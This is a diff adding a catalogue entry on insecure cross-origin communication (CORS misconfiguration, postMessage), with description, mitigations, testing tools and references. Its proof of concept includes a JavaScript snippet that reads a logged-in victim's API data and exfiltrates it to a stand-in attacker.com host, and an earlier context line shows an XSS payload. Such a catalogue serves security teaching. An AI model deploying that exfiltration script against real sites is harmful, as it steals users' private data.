@@ -6900,4 +6900,110 @@ https://example.com/page.html?user=<img src=x onerror=alert('XSS')>
 - [Google Web Fundamentals: XSS Prevention](https://developers.google.com/web/fundamentals/security/csp)
 
 ***
+# WEBVULN-061: Insecure Cross-Origin Communication
+
+## Category  
+Cross-Origin Resource Sharing (CORS) / Client-Side Security
+
+## Vulnerability  
+**Insecure Cross-Origin Communication**
+
+## Description  
+Insecure cross-origin communication arises when a web application improperly configures or implements mechanisms that allow scripts from untrusted origins to access sensitive resources or APIs. This often occurs due to misconfigured **Cross-Origin Resource Sharing (CORS)** headers or insecure use of cross-origin messaging (e.g., `postMessage`), leading to unauthorized data access, privilege escalation, or execution of unintended actions.
+
+Key risks include:
+- Allowing all origins (`Access-Control-Allow-Origin: *`)
+- Reflecting `Origin` headers dynamically without validation
+- Insecure use of `postMessage()` without origin verification
+- Cross-origin access to sensitive endpoints or APIs
+
+## Demo / Proof of Concept
+
+### Scenario: Misconfigured CORS
+
+**Vulnerable Response Header**
+```http
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+```
+
+### Exploit
+
+1. Attacker hosts the following script on a malicious domain:
+    ```javascript
+    fetch("https://victim.com/api/userinfo", {
+        credentials: "include"
+    })
+    .then(response => response.text())
+    .then(data => {
+        // Exfiltrate sensitive data
+        fetch("https://attacker.com/steal?data=" + encodeURIComponent(data));
+    });
+    ```
+
+2. Victim visits the attacker's site while logged in to `victim.com`.
+
+3. The attacker's script accesses sensitive data from the API and exfiltrates it.
+
+## Mitigation
+
+- **Restrict `Access-Control-Allow-Origin`**:
+  - Never use `*` with `Access-Control-Allow-Credentials: true`
+  - Whitelist only trusted, necessary origins:
+    ```http
+    Access-Control-Allow-Origin: https://trusted.example.com
+    ```
+
+- **Do not reflect arbitrary origins dynamically**:
+  ```javascript
+  if (allowedOrigins.includes(req.headers.origin)) {
+      res.setHeader("Access-Control-Allow-Origin", req.headers.origin);
+  }
+  ```
+
+- **Validate target origin in `postMessage` communication**:
+    ```javascript
+    window.addEventListener("message", function(event) {
+        if (event.origin !== "https://trusted.example.com") return;
+        // Safe to handle event.data
+    });
+    ```
+
+- **Disable unnecessary cross-origin features**:
+  - Limit cross-origin API access
+  - Avoid exposing sensitive data to scripts in different origins
+
+- **Use SameSite cookies and CSRF tokens where applicable**
+
+- **Implement security headers**:
+    ```http
+    Content-Security-Policy: default-src 'self';
+    ```
+
+## Testing Tools / Techniques
+
+- **Burp Suite / ZAP** – Scan for CORS misconfigurations
+- **curl** – Manually test CORS responses:
+    ```bash
+    curl -H "Origin: https://evil.com" --verbose https://target.com/api/
+    ```
+
+- **Postman** – Simulate cross-origin requests with credentials
+
+- **CORS Misconfiguration Scanners**:
+  - CORScanner
+  - CORSy
+
+- **Browser DevTools** – Inspect network requests and response headers
+
+## References
+
+- [OWASP CORS Misconfiguration](https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny)
+- [Mozilla Developer Network – CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
+- [PortSwigger CORS Vulnerabilities Guide](https://portswigger.net/web-security/cors)
+- [OWASP postMessage Security](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#postmessage)
+- [SameSite Cookies Explained](https://web.dev/samesite-cookies-explained/)
+***
+
+
 
